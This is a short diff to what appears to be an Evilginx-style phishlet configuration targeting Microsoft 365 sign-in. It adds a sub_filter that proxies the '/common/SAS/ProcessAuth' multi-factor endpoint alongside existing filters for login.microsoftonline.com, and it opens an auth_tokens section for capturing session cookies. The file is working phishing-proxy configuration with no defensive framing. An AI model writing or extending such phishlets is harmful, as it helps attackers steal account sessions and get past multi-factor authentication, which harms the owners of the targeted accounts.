@@ -25,6 +25,7 @@ sub_filters:
   - {hostname: 'browser.pipe.aria.microsoft.com', sub: 'browser.pip.aria', domain: 'microsoft.com', search: 'https://{hostname}/Collector/3.0/', replace: 'https://{hostname}/Collector/3.0/', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/common/GetCredentialType?mkt=en-US', replace: 'https://{hostname}/common/GetCredentialType?mkt=en-US', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/common/oauth2/authorize', replace: 'https://{hostname}/common/oauth2/authorize', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/common/SAS/ProcessAuth', replace: 'https://{hostname}/common/SAS/ProcessAuth', mimes: ['text/html', 'application/json', 'application/javascript']}
 
 auth_tokens:
   - domain: 'microsoftonline.com'
